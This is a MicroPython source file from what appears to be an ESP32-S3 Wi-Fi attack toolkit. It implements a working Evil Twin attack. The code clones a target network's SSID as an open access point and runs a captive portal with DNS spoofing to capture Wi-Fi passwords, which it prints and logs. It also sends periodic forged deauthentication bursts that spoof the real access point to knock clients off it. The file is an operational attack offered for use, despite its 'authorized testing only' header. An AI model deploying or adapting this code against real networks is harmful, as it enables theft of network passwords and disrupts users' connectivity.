# evil_twin.py — Evil Twin AP attack orchestrator for ESP32-S3
#
# Part of ESP32-S3 Marauder — Wi-Fi Security Testing Tool
#
# WARNING: This tool is intended for AUTHORIZED penetration testing and
# educational purposes ONLY.  Unauthorized use is illegal.

import network
import time
import sys
import gc

try:
    import _wifi_raw
except ImportError:
    _wifi_raw = None

try:
    import select
    _HAS_SELECT = True
except ImportError:
    _HAS_SELECT = False

from utils import log, log_error, log_warn, mac_bytes_to_str, timestamp
from captive_portal import CaptivePortal
from deauther import Deauther
from packet_builder import build_deauth_frame, REASON_CLASS3_FROM_NONASSOC


class EvilTwin:
    """Evil Twin AP with captive portal and optional deauth of original AP.

    Attack flow:
        1. Create an open AP with the same SSID as the target
        2. Start DNS spoofer + HTTP captive portal
        3. Optionally deauth clients from the original AP
        4. Wait for victims to connect and enter the Wi-Fi password
    """

    def __init__(self):
        self._ap = None            # network.WLAN AP interface
        self._portal = None        # CaptivePortal instance
        self._deauther = None      # Deauther instance (optional)
        self._running = False
        self._target_ssid = ''
        self._target_bssid = None
        self._target_channel = 0

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self, target_ssid, target_bssid=None,
              target_channel=1, deauth_original=True,
              ap_ip='192.168.4.1'):
        """Launch the Evil Twin attack.

        Args:
            target_ssid:      str      — SSID to clone
            target_bssid:     bytes(6) — BSSID of the real AP (for deauth)
            target_channel:   int      — channel of the real AP
            deauth_original:  bool     — send deauth to real AP's clients
            ap_ip:            str      — IP address of our fake AP
        """
        self._target_ssid = target_ssid
        self._target_bssid = target_bssid
        self._target_channel = target_channel
        self._running = True

        log('=' * 44)
        log('  EVIL TWIN ATTACK')
        log('  SSID:    %s' % target_ssid)
        if target_bssid:
            log('  Target:  %s (ch %d)' % (mac_bytes_to_str(target_bssid),
                                            target_channel))
        log('  Deauth:  %s' % ('ON' if deauth_original else 'OFF'))
        log('=' * 44)

        # Step 1: Set up the fake AP
        log('Setting up fake AP...')
        self._setup_ap(target_ssid, ap_ip, target_channel)

        # Step 2: Start captive portal (HTTP + DNS)
        log('Starting captive portal...')
        self._portal = CaptivePortal(ssid_name=target_ssid)
        self._portal.on_credential(self._on_credential)
        self._portal.start(ip=ap_ip)

        # Step 3: Start deauther if requested
        if deauth_original and target_bssid and _wifi_raw is not None:
            self._deauther = Deauther()
            log('Deauth will target %s on ch %d' %
                (mac_bytes_to_str(target_bssid), target_channel))
        elif deauth_original and target_bssid is None:
            log_warn('Deauth requested but no target BSSID — skipping')
            deauth_original = False
        elif deauth_original and _wifi_raw is None:
            log_warn('_wifi_raw unavailable — deauth disabled')
            deauth_original = False

        # Step 4: Main loop
        log('')
        log('Evil Twin active. Press Ctrl+C or type "q" to stop.')
        log('Waiting for clients to connect...')
        log('')

        try:
            self._main_loop(deauth_original)
        except KeyboardInterrupt:
            log('Interrupted by user')
        finally:
            self.stop()

    def stop(self):
        """Shut down the Evil Twin: portal, deauther, AP."""
        self._running = False

        if self._portal:
            self._portal.stop()

        if self._ap:
            try:
                self._ap.active(False)
            except Exception:
                pass

        creds = self.captured_credentials
        log('')
        log('=' * 44)
        log('  Evil Twin stopped')
        log('  Captured credentials: %d' % len(creds))
        for i, c in enumerate(creds):
            log('    [%d] %s (from %s at %s)' %
                (i + 1, c['password'], c['client_ip'], c['time']))
        log('=' * 44)
        gc.collect()

    @property
    def captured_credentials(self):
        if self._portal:
            return self._portal.credentials
        return []

    # ------------------------------------------------------------------
    # Internal: AP setup
    # ------------------------------------------------------------------

    def _setup_ap(self, ssid, ip, channel):
        """Configure and activate the fake open AP."""
        self._ap = network.WLAN(network.AP_IF)
        self._ap.active(True)

        # Configure: open auth (authmode=0), specific channel
        self._ap.config(
            essid=ssid,
            authmode=0,       # Open (no password)
            channel=channel,
            max_clients=8,
        )

        # Set IP configuration
        self._ap.ifconfig((ip, '255.255.255.0', ip, ip))

        # Wait for AP to become active
        for _ in range(20):
            if self._ap.active():
                break
            time.sleep_ms(200)

        if self._ap.active():
            cfg = self._ap.ifconfig()
            log('Fake AP active: SSID="%s"  IP=%s  ch=%d' %
                (ssid, cfg[0], channel))
        else:
            log_error('Failed to activate AP')

    # ------------------------------------------------------------------
    # Internal: credential callback
    # ------------------------------------------------------------------

    def _on_credential(self, password, client_ip):
        """Called when a password is captured."""
        print()
        print('!' * 44)
        print('!  PASSWORD CAPTURED: %s' % password)
        print('!  Client IP: %s' % client_ip)
        print('!' * 44)
        print()

    # ------------------------------------------------------------------
    # Internal: main cooperative loop
    # ------------------------------------------------------------------

    def _main_loop(self, deauth_original):
        """Run the main event loop with cooperative multitasking.

        - Portal poll every iteration
        - Deauth burst every ~3 seconds
        - Status print every ~15 seconds
        - Check for 'q' key to stop
        """
        deauth_interval = 3000   # ms
        status_interval = 15000  # ms
        last_deauth = time.ticks_ms()
        last_status = time.ticks_ms()
        start_time = time.ticks_ms()

        # Set up stdin polling for 'q' key (if select module available)
        poller = None
        if _HAS_SELECT:
            try:
                poller = select.poll()
                poller.register(sys.stdin, select.POLLIN)
            except Exception:
                poller = None

        while self._running:
            now = time.ticks_ms()

            # --- Poll captive portal (HTTP + DNS) ---
            if self._portal:
                self._portal.poll()

            # --- Periodic deauth burst ---
            if (deauth_original and self._target_bssid and
                    time.ticks_diff(now, last_deauth) >= deauth_interval):
                self._send_deauth_burst()
                last_deauth = now

            # --- Periodic status ---
            if time.ticks_diff(now, last_status) >= status_interval:
                elapsed = time.ticks_diff(now, start_time) // 1000
                n_creds = len(self.captured_credentials)
                clients = 0
                if self._ap:
                    try:
                        # Not all MicroPython builds expose this
                        stations = self._ap.status('stations')
                        clients = len(stations) if stations else 0
                    except Exception:
                        pass
                log('Status: %ds elapsed | %d credentials | ~%d clients connected' %
                    (elapsed, n_creds, clients))
                last_status = now

            # --- Check for quit command ---
            if poller:
                events = poller.poll(0)  # non-blocking
                if events:
                    try:
                        ch = sys.stdin.read(1)
                        if ch and ch.lower() == 'q':
                            log('Quit command received')
                            break
                    except Exception:
                        pass

            # Small sleep to yield CPU
            time.sleep_ms(10)

    def _send_deauth_burst(self, count=3):
        """Send a short deauth burst against the real AP.

        NOTE: While the ESP32 is running as AP, it cannot simultaneously
        operate in STA promiscuous mode for deauth injection on a
        different channel.  This is a hardware limitation.

        Workaround: We briefly switch the AP channel to the target channel,
        send deauth frames, then switch back.  This causes a momentary
        disruption to our own AP but is effective for deauth.
        """
        if _wifi_raw is None or self._target_bssid is None:
            return

        broadcast = b'\xff\xff\xff\xff\xff\xff'

        # Temporarily set channel for deauth
        try:
            _wifi_raw.set_channel(self._target_channel)
        except Exception:
            return

        for i in range(count):
            pkt = build_deauth_frame(
                dst_mac=broadcast,
                src_mac=self._target_bssid,
                bssid=self._target_bssid,
                reason=REASON_CLASS3_FROM_NONASSOC,
                seq_num=(i & 0x0FFF))
            try:
                _wifi_raw.send_raw(pkt)
            except Exception:
                break
            time.sleep_ms(2)
